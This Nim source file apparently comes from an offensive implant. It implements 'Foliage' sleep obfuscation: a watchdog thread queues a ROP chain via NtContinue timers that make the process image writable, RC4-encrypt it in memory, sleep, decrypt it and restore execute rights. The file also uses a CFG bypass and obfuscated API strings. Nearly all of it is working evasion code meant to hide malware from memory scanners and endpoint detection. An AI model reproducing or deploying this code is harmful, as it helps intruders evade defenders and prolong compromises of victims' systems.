# Foliage — Watchdog thread-based sleep obfuscation
#
# A dedicated watchdog thread orchestrates the sleep obfuscation ROP chain
# using timer queues, while the main thread is suspended. This avoids
# timer queue ETW telemetry on the main thread (timers fire on the watchdog)
# and provides a different execution pattern than Ekko (main-thread timers)
# or Zilean (self-targeting APCs).

import winim/lean
import std/random
import cfg
import strenc

type
  USTRING* {.bycopy.} = object
    Length*: DWORD
    MaximumLength*: DWORD
    Buffer*: PVOID

  FoliageParams = object
    hMainThread: HANDLE
    hDoneEvent: HANDLE
    imageBase: PVOID
    imageSize: DWORD
    sleepTime: DWORD

randomize()

proc findBaseAddress(start: PVOID): PVOID =
  var candidate: PVOID = start
  var candidateMZ: PIMAGE_DOS_HEADER
  var candidatePE: PIMAGE_NT_HEADERS
  var offset: LONG
  while true:
    candidateMZ = cast[PIMAGE_DOS_HEADER](candidate)
    if candidateMZ.e_magic == IMAGE_DOS_SIGNATURE:
      offset = candidateMZ.e_lfanew
      if offset > sizeof(IMAGE_DOS_HEADER) and offset < 1024:
        candidatePE = cast[PIMAGE_NT_HEADERS](cast[uint](candidate) + cast[uint](offset))
        if candidatePE.Signature == IMAGE_NT_SIGNATURE:
          return candidate
    candidate = cast[PVOID](cast[uint](candidate) - 1)

proc watchdogThread(param: LPVOID): DWORD {.stdcall.} =
  let p = cast[ptr FoliageParams](param)

  var CtxThread: CONTEXT
  var RopProtRW: CONTEXT
  var RopMemEnc: CONTEXT
  var RopDelay: CONTEXT
  var RopMemDec: CONTEXT
  var RopProtRX: CONTEXT
  var RopSetEvt: CONTEXT

  var hTimerQueue: HANDLE
  var hNewTimer: HANDLE
  var hEvent: HANDLE
  var OldProtect: DWORD = 0

  var KeyBuf: array[16, CHAR] = [
    CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)),
    CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)),
    CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)),
    CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255))
  ]
  var Key: USTRING = USTRING(Length: 16, MaximumLength: 16, Buffer: KeyBuf.addr)
  var Img: USTRING = USTRING(Length: 0)

  Img.Buffer = p.imageBase
  Img.Length = p.imageSize
  Img.MaximumLength = p.imageSize

  var NtContinue: PVOID = GetProcAddress(GetModuleHandleA(obf("ntdll")), obf("NtContinue"))
  var SysFunc032: PVOID = GetProcAddress(LoadLibraryA(obf("Advapi32")), obf("SystemFunction032"))

  # CFG bypass for NtContinue
  discard evadeCFG(NtContinue)

  hEvent = CreateEventW(nil, 0, 0, nil)
  hTimerQueue = CreateTimerQueue()

  # Use RtlCaptureContext on this (watchdog) thread via a timer
  if CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](RtlCaptureContext),
                          addr(CtxThread), 0, 0, WT_EXECUTEINTIMERTHREAD):
    WaitForSingleObject(hEvent, 0x32)

    copyMem(addr(RopProtRW), addr(CtxThread), sizeof(CONTEXT))
    copyMem(addr(RopMemEnc), addr(CtxThread), sizeof(CONTEXT))
    copyMem(addr(RopDelay),  addr(CtxThread), sizeof(CONTEXT))
    copyMem(addr(RopMemDec), addr(CtxThread), sizeof(CONTEXT))
    copyMem(addr(RopProtRX), addr(CtxThread), sizeof(CONTEXT))
    copyMem(addr(RopSetEvt), addr(CtxThread), sizeof(CONTEXT))

    var VirtualProtectAddr = GetProcAddress(GetModuleHandleA(obf("kernel32")), obf("VirtualProtect"))

    # VirtualProtect(RW)
    dec(RopProtRW.Rsp, 8)
    RopProtRW.Rip = cast[DWORD64](VirtualProtectAddr)
    RopProtRW.Rcx = cast[DWORD64](p.imageBase)
    RopProtRW.Rdx = cast[DWORD64](p.imageSize)
    RopProtRW.R8 = PAGE_READWRITE
    RopProtRW.R9 = cast[DWORD64](addr(OldProtect))

    # Encrypt
    dec(RopMemEnc.Rsp, 8)
    RopMemEnc.Rip = cast[DWORD64](SysFunc032)
    RopMemEnc.Rcx = cast[DWORD64](addr(Img))
    RopMemEnc.Rdx = cast[DWORD64](addr(Key))

    # Sleep — wait on main thread handle (unsignaled) for the sleep duration
    dec(RopDelay.Rsp, 8)
    RopDelay.Rip = cast[DWORD64](WaitForSingleObject)
    RopDelay.Rcx = cast[DWORD64](p.hMainThread)
    RopDelay.Rdx = cast[DWORD64](p.sleepTime)

    # Decrypt
    dec(RopMemDec.Rsp, 8)
    RopMemDec.Rip = cast[DWORD64](SysFunc032)
    RopMemDec.Rcx = cast[DWORD64](addr(Img))
    RopMemDec.Rdx = cast[DWORD64](addr(Key))

    # VirtualProtect(RX)
    dec(RopProtRX.Rsp, 8)
    RopProtRX.Rip = cast[DWORD64](VirtualProtectAddr)
    RopProtRX.Rcx = cast[DWORD64](p.imageBase)
    RopProtRX.Rdx = cast[DWORD64](p.imageSize)
    RopProtRX.R8 = PAGE_EXECUTE_READWRITE
    RopProtRX.R9 = cast[DWORD64](addr(OldProtect))

    # SetEvent
    dec(RopSetEvt.Rsp, 8)
    RopSetEvt.Rip = cast[DWORD64](SetEvent)
    RopSetEvt.Rcx = cast[DWORD64](hEvent)

    # Schedule the ROP chain on the timer queue thread
    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopProtRW), 100, 0, WT_EXECUTEINTIMERTHREAD)
    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopMemEnc), 200, 0, WT_EXECUTEINTIMERTHREAD)
    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopDelay), 300, 0, WT_EXECUTEINTIMERTHREAD)
    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopMemDec), 400, 0, WT_EXECUTEINTIMERTHREAD)
    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopProtRX), 500, 0, WT_EXECUTEINTIMERTHREAD)
    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopSetEvt), 600, 0, WT_EXECUTEINTIMERTHREAD)

    WaitForSingleObject(hEvent, INFINITE)

  DeleteTimerQueue(hTimerQueue)
  CloseHandle(hEvent)

  # Signal the main thread that we're done
  SetEvent(p.hDoneEvent)
  return 0

proc foliageObf*(st: int): VOID =
  var ImageBase: PVOID = nil
  var ImageSize: DWORD = 0
  var SleepTime: DWORD = cast[DWORD](st)

  ImageBase = findBaseAddress(cast[PVOID](findBaseAddress))
  ImageSize = (cast[PIMAGE_NT_HEADERS](cast[uint](ImageBase) +
      cast[uint]((cast[PIMAGE_DOS_HEADER](ImageBase)).e_lfanew))).OptionalHeader.SizeOfImage

  # Get a real handle to the current thread (not pseudo-handle)
  var hMainThread: HANDLE
  discard DuplicateHandle(
    GetCurrentProcess(), GetCurrentThread(),
    GetCurrentProcess(), addr(hMainThread),
    0, FALSE, DUPLICATE_SAME_ACCESS
  )

  var hDoneEvent = CreateEventW(nil, 0, 0, nil)

  var params = FoliageParams(
    hMainThread: hMainThread,
    hDoneEvent:  hDoneEvent,
    imageBase:   ImageBase,
    imageSize:   ImageSize,
    sleepTime:   SleepTime,
  )

  # Spawn watchdog thread — it will run the entire ROP chain on its own timer queue
  var threadId: DWORD
  let hWatchdog = CreateThread(nil, 0, watchdogThread, addr(params), 0, addr(threadId))

  # Main thread waits for the watchdog to complete the full encrypt→sleep→decrypt cycle
  WaitForSingleObject(hDoneEvent, INFINITE)

  CloseHandle(hWatchdog)
  CloseHandle(hMainThread)
  CloseHandle(hDoneEvent)
